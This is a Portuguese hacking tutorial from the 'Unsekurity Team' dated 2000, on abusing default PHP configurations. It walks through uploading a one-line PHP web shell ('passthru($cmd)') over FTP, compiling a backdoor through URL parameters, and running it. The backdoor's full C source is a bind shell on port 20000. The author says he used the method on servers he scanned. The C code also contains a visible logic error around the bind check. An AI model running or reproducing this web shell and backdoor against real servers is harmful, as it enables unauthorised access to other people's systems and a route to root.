@@ -1,0 +1,338 @@
+############################################################################
+############################ UNSEKURITY TEAM ###############################
+############################################################################
+
+26.05.00 -> Inicial Versao.
+29.05.00 -> Atualizacao.
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+Este e outros artigos podem ser obtidos em:
+http://unsekurity.virtualave.net/
+http://unsekurity.cyberpunk.com.br/
+
+OBSERVACAO: Nao nos responsabilizamos pelo mau uso das informacoes aqui
+	    contidas, bem como dos exemplos e dados aqui fornecidos.Este
+	    arquivo texto possui somente propositos educacionais.
+
+
+Alguns pre-requisitos se fazem necessarios para o total entendimento deste
+artigo, dentre os quais se destacam, conhecimento basico de PHP-CGI, Linux,
+FTP e HTTP.
+
+
+		       -------------------------
+                      |  O TRUQUE DO CGI(PHP)   |
+		       -------------------------
+
+---------------------------------INDICE-------------------------------------
+
+1 - INTRODUCAO.
+2 - POSSIVEIS TRUQUES.
+    2.1 - Pre - Requesitos
+    2.2 - Criando o PHP-CGI
+    2.3 - Executando a Tecnica
+3 - TERMINANDO.
+    3.1 - Links e Referencias.
+    3.2 - Consideracoes Finais.
+
+----------------------------------------------------------------------------
+
+---------------
+1 - INTRODUCAO |
+---------------
+
+A tecnica que pretendo descrever aqui nao eh nova.Eh amplamente divulgada
+na internet, mas por algum motivo, eh meio que 'desprezada'.Muitos
+servidores costumam liberar acesso a publicacao de home pages atraves de
+ftp(sem acesso a shell).Acontece que se o servidor em questao
+disponibiliza algum tipo de cgi, e nao seta corretamente o uso do
+diretorio aonde um cgi se torna executavel o sistema alvo corre serio
+risco.O Esquema que pretendo disponibilizar aqui eh valido em sistemas
+Linux(expansivel a outros),WEB SERVER Apache(tendo ou nao Stronghold), 
+e principalmente PHP instalado(diga-se mal configurado!).
+Pouco tempo atras, foi disponibilizado na web um documento chamado 
+"how.defaced.apache.org.txt" que descrevia passo a passo a tecnica usada
+por esses caras para invadir o servidor e depois mudar a hp de lah.Voce
+pode encontrar este texto na packetstorm(http://packetstorm.securify.com),
+Nesse arquivo texto tem algo muito interessante, eh o seguinte:
+
+/*
+ * In short:
+ */
+- ftproot==webroot, worldwritable dirs allowing us to upload and execute
+  php3 scripts
+- mysqld running as root, with a FULL RIGHTS login without a password.
+
+Notaram algo interessante aih?? "diretorios wordlwritable(todo mundo pode
+escrever) que nos permite enviar e """executar""" php3 scripts.Quando eu
+lih isso fiquei mais do que intrigado.Um membro do Unsekurity Team jah
+havia comentado comigo que 'permissao para executar cgi eh a mesma coisa
+que dar shell', mas o pessoal da apache ia configurar mal seu proprio
+servidor??? O problema nao estah nem nunca esteve no apache,o problema
+consiste que a instalacao default(padrao) do PHP faz com que se possa
+executar qualquer script php em qualquer diretorio na maquina local.Nao
+importa qual seja o WEB SERVER, o problema estah na instalacao padrao
+do PHP.A versao atual(PHP 4.0.0) tambem possui esse tipo de configuracao 
+default.Os caras que alteraram aquela pagina(a do apache) nao divulgaram 
+isso, nao me pergunte por que.:) 
+Como PHP eh uma linguagem versatil, scripts cgi em PHP nos dao inumeras
+chances de obter sucesso em varios tipos de investidas por aih.
+
+----------------------
+2 - POSSIVEIS TRUQUES |
+----------------------
+
+Nesse item serah abordado como eh o funcionamento passo a passo da tecnica
+para se conseguir execucao de comando shell na maquina alvo.
+
+2.1 - Pre - Requesitos
+-----------------------
+
+Antes de mais nada, conhecimentos basicos de PHP-CGI, Linux, FTP e
+HTTP.No host alvo, voce precisa ter permissao para algumas coisas, dentre
+elas: poder mandar arquivos(ter permissao de escrita num diretorio), o
+host alvo necessita estar com PHP instalado e com configuracao padrao, ou
+seja, mal-configurado(Nos ultimos dias tive 100% de sucesso!!),os esquemas
+que testei foram em servidor Apache(1.3.6, 1.3.9, 1.3.12) e Apache nas
+versoes acima citadas com Stronghold 2.4 , 2.4.1, 2.4.2, As versoes do
+PHP foram a 3.0.12, 3.0.14 e 4.0.0.De qualquer forma,veja e pesquise se as
+versoes e as permissoes estao disponiveis para uma investida e implementacao 
+bem sucedida desta tecnica.Citarei aqui esquemas para o Linux(AIX,HP-UX,BSDs 
+confirmados tambem), de modo que, podem muito bem serem extendidos para 
+outros SOs.Se voce possui acesso a ftp com conta,mas sem shell, num host com 
+as configuracoes acima setadas, voce pode testar perfeitamente.
+
+
+2.2 - Criando o php-cgi
+-------------------------
+
+PHP eh uma linguagem interpretada, assim como PERL, SHELL Script e etc.
+Ela eh voltada para aplicacoes na Internet, mais especificamente WEB.
+Conheco muito pouco de cgis, de modo que nao irei ensinar nada sobre
+PHP-CGI.O exemplo descrito nesse texto dos caras que invadiram lah pode
+ser usado, veja:
+
+-----------------------------------------------------------------------
+<?
+passthru($cmd);
+?>
+-----------------------------------------------------------------------
+
+Todo PHP-CGI comeca com "<?" e termina com "?>" de modo que os comandos
+devem estar compreendidos entre essas duas instrucoes.Esse php eh
+suficiente para execucao de comando em shell, essa instrucao "passthru"
+eh equivalente a "system" e retorna dados obtidos com a execucao dela.
+
+2.3 - Executando a Tecnica 
+---------------------------
+
+Se voce tiver acesso ao httpd.conf do apache, seria muito bom.Lah tem as
+definicoes dos php-cgis que podem ser executados no sistema(php ou php3),
+e tambem tem o nome do diretorio padrao para o apache ler as paginas dos
+usuarios(geralmente eh public_html), se voce nao conseguir este arquivo
+(ele ateh diria se o servidor alvo pode estar vuln ou nao), tente na
+marra,criando um diretorio public_html no dir aonde tem escrita.A tecnica 
+consiste no envio do cgi executando os parametros que desejarmos.Voce pode 
+enviar uma backdoor que binda uma shell como usuario comum(nobody),
+(Exemplo: a backdoor que disponibilizo no tutorial de sockets que binda uma 
+porta TCP).Em seguida via http mandar o sistema compilar a backdoor, veremos 
+passo a passo, abaixo:
+
+[seuhost]# ftp host_alvo
+
+ftp> mkdir public_html
+257 "/home/usuario/public_html" new directory created.
+ftp> cd public_html
+250 CWD command successful.
+ftp> mkdir cgi
+257 "/home/usuario/public_html/cgi" new directory created.
+ftp> chmod 777 cgi
+200 CHMOD command successful.
+ftp> cd cgi
+250 CWD command successful.
+ftp> put nlback.c
+local: nlback.c remote: nlback.c
+200 PORT command successful.
+150 Opening BINARY mode data connection for t.c.
+226 Transfer complete.
+1230 bytes sent in 1.00221 secs (1.4e+02 Kbytes/sec)
+ftp> put out.php
+local: out.php remote: out.php
+200 PORT command successful.
+150 Opening BINARY mode data connection for out.php.
+226 Transfer complete.
+22 bytes sent in 0.00121 secs (2 Kbytes/sec)
+ftp> exit
+
+Depois eh soh mandar compilar a backdor via Browser:
+
+http://servidor/~usuario/cgi/outphp.php?cmd=gcc+-o+nlback+nlback.c
+
+E depois executar a backdoor:
+
+http://servidor/~usuario/cgi/outphp.php?cmd=./nlback
+
+Pronto, voce possui uma porta aberta, entao, basta telnet pra ela.Lah
+dentro voce tenta obter root por outros meios.Leia o esquema dos caras,
+quem sabe voce pode se deparar com mais configuracoes defaults.Vai uma
+backdoor que binda shell aih, pode ser melhorada perfeitamente:
+
+------------------------------nlback.c-----------------------------------
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <netinet/in.h>
+
+#define  ERRO        -1
+/* Mude o numero da porta abaixo */
+#define  PORTA    20000
+
+int binda(){
+int Meusocket;
+int tamanho, conector;
+struct sockaddr_in hacker;
+struct sockaddr_in vitima;
+char engana[50];
+if(fork() == 0){
+vitima.sin_family=AF_INET;
+vitima.sin_addr.s_addr= htonl(INADDR_ANY);
+vitima.sin_port= htons(PORTA);
+bzero(&(vitima.sin_zero), 8);
+Meusocket = socket(AF_INET,SOCK_STREAM,0);
+if(Meusocket < 0){
+fprintf(stderr,"Erro em socket()!\n");
+exit(ERRO);
+                 }
+bind(Meusocket,(struct sockaddr *)&vitima,sizeof(vitima));
+if(bind < 0){
+fprintf(stderr,"Erro em bind()!\n");
+exit(ERRO);
+
+listen(Meusocket,2);
+tamanho = sizeof(hacker);
+conector=accept(Meusocket,(struct sockaddr *)&hacker,&tamanho);
+
+if(conector < 0){
+fprintf(stderr,"Erro em accept()!\n");
+                }
+dup2(conector,0);
+dup2(conector,1);
+dup2(conector,2);
+execl("/bin/sh","sh",0);
+        }
+}
+
+main(){
+binda();
+}
+
+----------------------------------------------------------------------------
+
+
+3 - TERMINANDO
+----------------
+
+Eu pesquisei um pouco sobre isso internet a fora, e ateh o exato momento,
+nao encontrei documentos falando mesmo sobre isso.A instalacao do PHP
+alerta sobre esse perigo, de modo que, nao se trata de nenhum bug e sim
+de uma mal-configuracao por parte do administrador.Existem varios esquemas
+iguais a esses(programas mal-configurados por default) e aos poucos nos
+iremos mostrar mais alguns, os tutoriais que estao a caminho tem consumido
+muito tempo de modo que estamos sem tempo para fazer algo mais 'descente'
+e entendivel que isto aqui.
+
+3.1 - Links e Referencias
+--------------------------
+
+* Sobre PHP:
+
+http://www.php.net/ -> HP oficial do PHP.:)..Eles alertam, os admins
+		       eh que sao preguicosos.
+
+http://tutorial.virtualave.net/ -> Procure algo sobre cgis.
+
+http://packetstorm.securify.com/ -> Voce pode achar o texto dos caras
+				    que invadiram a www.apache.org.
+
+http://www.apache.org/ -> Sem sombra de duvida o melhor WEB Server que
+			  existe.
+
+http://www.int.c2.net/ -> Implementacao SSL para o Apache(StrongHold).
+
+* Home pages atuais do Unsekurity Team:
+
+http://unsekurity.virtualave.net/
+http://unsekurity.cyberpunk.com.br/
+
+* Outros Links muito interessantes:
+
+http://www.bufferoverflow.org/
+http://www.hacker.com.br/
+http://www.taldowin.com.br/
+http://www.securenet.com.br/
+
+3.2 - Consideracoes Finais
+----------------------------
+
+Sem duvida que obter acesso a execucao de um cgi eh um passo enorme em
+direcao a execucao de comandos shell e consequentemente obtencao de root.
+O que descrevo nesse artigo nao eh algo novo, longe disso, para um fucador,
+toda e qualquer tecnica eh vantajosa, e essa nao foge a regra.Amigo,Newbie,
+assim como o problema do frontpage(mal-configurado por default) ainda eh
+atual, apesar de ser uma vulnerabilidade antiga, essa do PHP eh realmente
+muito comprometedora, por isso, amigo, nao vah fazer bobagens.
+
+Agradecimentos a todos do Unsekurity Team e ao pessoal que vem
+acompanhando nossas publicacoes e dando apoio e contribuindo de alguma
+forma.
+
+							Nash Leon
+
+
+			 ******************
+			 *  Atualizacoes  *
+			 ******************
+
+29.05.00:
+
+No dia 27.05.00 tomamos a iniciativa de divulgar este problema para a
+comunidade de seguranca, de forma suscinta, esperando ver a reacao da
+mesma frente a esse problema.Tres mail lists foram contactadas(e varios
+webforums),dentre elas a infoseg(representante da cert aqui no brasil), 
+ateh o exato momento somente 1 mail list expos nosso email(security-net) 
+e ateh entao nenhum comentario a respeito.Enquanto o tempo vai passando,no
+underground, o tutorial vem sendo amplamente divulgado.Eu andei pesquisando 
+mais redes e procurando ver como esse problema pode ser maior expandido, e 
+nas minhas investidas ateh o exato momento, somente 1 rede estava 'segura', 
+ou seja, o PHP estava instalado, mas nao instalado com a configuracao padrao 
+e sim com os diretorios devidamente setados(ateh que enfim um admin
+responsavel????:)).Como ateh o exato momento a seguranca nao tem dado a 
+minima inportancia, vou expandir mais os possiveis esquemas:
+
++ Como foi descrito pelos caras que invadiram o servidor da apache.org,
+  diretorios ftproot==webroot com direito a escrita estao tambem sujeitos
+  a implementacao da tecnica.
+
++ Servidores samba que permitem a montagem de diretorios com home pages,
+  ou diretorios com permissao de acessos via http tambem podem estar
+  sujeitos a implementacao da tecnica.
+
++ Servidores NFS que como no item acima, permitem a montagem de diretorios
+  com home pages ou diretorios com permissao de acessos via http tambem 
+  estao suscetiveis a implementacao da tecnica.
+
++ Servidores de ftp que se utilizam de mirrors, podem facilmente serem
+  enganados, caso os mirrors jah tenham sido 'invadidos'.
+
+Creio que existam mais tecnicas possiveis de serem implementadas ainda.
+Sem mais.
+
+							Nash Leon
+------------------------------------EOF-------------------------------------
